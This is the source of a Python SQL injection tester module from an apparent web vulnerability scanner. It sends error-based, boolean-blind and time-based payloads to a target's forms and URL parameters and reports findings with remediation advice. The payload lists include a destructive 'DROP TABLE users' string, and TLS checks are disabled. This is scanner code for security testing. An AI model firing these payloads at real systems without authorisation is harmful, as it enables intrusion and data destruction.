"""
scanner/sqli_tester.py
Tests for SQL injection: error-based, boolean-blind, and time-based.
Upgraded: blind detection via response-size diff, SLEEP/WAITFOR time probes.
"""

import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from utils.logger import setup_logger

logger = setup_logger("sqli_tester")

# ── Error-based payloads ────────────────────────────────────────────────────
SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",
]

# ── Boolean-blind payloads (pair: true-condition vs false-condition) ─────────
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--",  "' AND 1=2--"),
    ("1 AND 1=1",    "1 AND 1=2"),
]

# ── Time-based payloads ──────────────────────────────────────────────────────
TIME_PAYLOADS = [
    ("'; SELECT SLEEP(4)--",          4.0),
    ("' AND SLEEP(4)--",              4.0),
    ("1; WAITFOR DELAY '0:0:4'--",    4.0),
    ("'; IF(1=1) WAITFOR DELAY '0:0:4'--", 4.0),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", 4.0),
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "ora-01756",
    "postgresql error",
    "sqlite error",
    "syntax error near",
    "pg_query",
    "supplied argument is not a valid mysql",
    "invalid query",
    "sql command not properly ended",
    "division by zero",
    "sqlstate",
    "unterminated string",
]


class SQLiTester:
    def __init__(self, target: str):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "CyberScout-Scanner/2.0"})
        self.findings = []
        self._found_params: set = set()  # deduplicate findings per param

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _request(self, url, method, data, timeout=12):
        if method == "post":
            return self.session.post(url, data=data, timeout=timeout, verify=False)
        return self.session.get(url, params=data, timeout=timeout, verify=False)

    def get_forms(self) -> list:
        try:
            import urllib3; urllib3.disable_warnings()
            resp = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(resp.text, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            logger.warning(f"Could not fetch forms: {e}")
            return []

    def extract_form_data(self, form) -> tuple:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        action_url = urljoin(self.target, action) if action else self.target
        inputs = {}
        for tag in form.find_all(["input", "textarea", "select"]):
            name = tag.get("name")
            if name:
                inputs[name] = tag.get("value", "test")
        return action_url, method, inputs

    def _add_finding(self, param, url, technique, payload, evidence):
        key = (param, technique)
        if key in self._found_params:
            return
        self._found_params.add(key)

        severity_map = {"error-based": "critical", "boolean-blind": "high", "time-based": "high"}
        self.findings.append({
            "module": "sqli",
            "severity": severity_map.get(technique, "high"),
            "title": f"SQL Injection ({technique.title()}) — Parameter: '{param}'",
            "description": (
                f"Parameter '{param}' at {url} is vulnerable to {technique} SQL injection. "
                f"Technique: {technique}. Payload triggered detectable response difference."
            ),
            "recommendation": (
                "Use parameterized queries / prepared statements exclusively. "
                "Implement an ORM. Never concatenate user input into SQL strings. "
                "Apply input validation and principle of least privilege on DB accounts."
            ),
            "evidence": evidence
        })

    # ── Error-based ──────────────────────────────────────────────────────────

    def _test_error_based(self, url, method, param, inputs):
        for payload in SQLI_ERROR_PAYLOADS:
            data = inputs.copy()
            data[param] = payload
            try:
                resp = self._request(url, method, data)
                body = resp.text.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        self._add_finding(
                            param, url, "error-based", payload,
                            f"Payload: {payload!r} | Triggered signature: {sig!r}"
                        )
                        return True
            except Exception as e:
                logger.debug(f"Error-based test failed: {e}")
        return False

    # ── Boolean-blind ────────────────────────────────────────────────────────

    def _test_boolean_blind(self, url, method, param, inputs):
        # Get baseline response size
        try:
            baseline = self._request(url, method, inputs)
            base_size = len(baseline.content)
        except Exception:
            return False

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                d_true  = {**inputs, param: true_payload}
                d_false = {**inputs, param: false_payload}
                r_true  = self._request(url, method, d_true)
                r_false = self._request(url, method, d_false)

                size_true  = len(r_true.content)
                size_false = len(r_false.content)
                diff = abs(size_true - size_false)

                # Heuristic: >100 byte diff with true/false and baseline near true = blind SQLi
                if diff > 100 and abs(size_true - base_size) < diff:
                    self._add_finding(
                        param, url, "boolean-blind", true_payload,
                        f"True-condition response size {size_true}B vs False-condition {size_false}B "
                        f"(diff={diff}B). Baseline was {base_size}B."
                    )
                    return True
            except Exception as e:
                logger.debug(f"Boolean-blind test failed: {e}")
        return False

    # ── Time-based ───────────────────────────────────────────────────────────

    def _test_time_based(self, url, method, param, inputs):
        for payload, expected_delay in TIME_PAYLOADS:
            data = inputs.copy()
            data[param] = payload
            try:
                start = time.monotonic()
                self._request(url, method, data, timeout=expected_delay + 3)
                elapsed = time.monotonic() - start
                if elapsed >= expected_delay * 0.8:
                    self._add_finding(
                        param, url, "time-based", payload,
                        f"Response took {elapsed:.2f}s (expected ≥{expected_delay * 0.8:.1f}s). "
                        f"Payload: {payload!r}"
                    )
                    return True
            except requests.Timeout:
                # Timeout itself is evidence of a time-based delay
                self._add_finding(
                    param, url, "time-based", payload,
                    f"Request timed out after {expected_delay + 3}s. Likely time-based SQLi."
                )
                return True
            except Exception as e:
                logger.debug(f"Time-based test failed: {e}")
        return False

    # ── Main runner ──────────────────────────────────────────────────────────

    def _test_all_techniques(self, url, method, param, inputs):
        if self._test_error_based(url, method, param, inputs):
            return
        if self._test_boolean_blind(url, method, param, inputs):
            return
        self._test_time_based(url, method, param, inputs)

    def test_forms(self):
        forms = self.get_forms()
        for form in forms:
            url, method, inputs = self.extract_form_data(form)
            if inputs:
                for param in inputs:
                    self._test_all_techniques(url, method, param, inputs)
        return forms

    def test_url_params(self):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        if not params:
            return

        base_url = self.target.split("?")[0]
        for param in params:
            inputs = {k: v[0] for k, v in params.items()}
            self._test_all_techniques(base_url, "get", param, inputs)

    def run(self) -> list:
        logger.info(f"Starting SQL Injection tests on {self.target}")
        import urllib3; urllib3.disable_warnings()

        forms = self.test_forms()
        if not forms:
            logger.info("No forms found, testing URL parameters.")
            self.test_url_params()

        if not self.findings:
            self.findings.append({
                "module": "sqli",
                "severity": "info",
                "title": "No SQL Injection Detected",
                "description": (
                    "No error-based, boolean-blind, or time-based SQL injection was detected. "
                    "This does not rule out second-order or stored SQLi."
                ),
                "recommendation": "Perform manual code review and use parameterized queries throughout.",
                "evidence": f"Tested error-based ({len(SQLI_ERROR_PAYLOADS)} payloads), "
                            f"boolean-blind ({len(BOOLEAN_PAIRS)} pairs), "
                            f"time-based ({len(TIME_PAYLOADS)} payloads) on {len(forms)} form(s)."
            })

        return self.findings
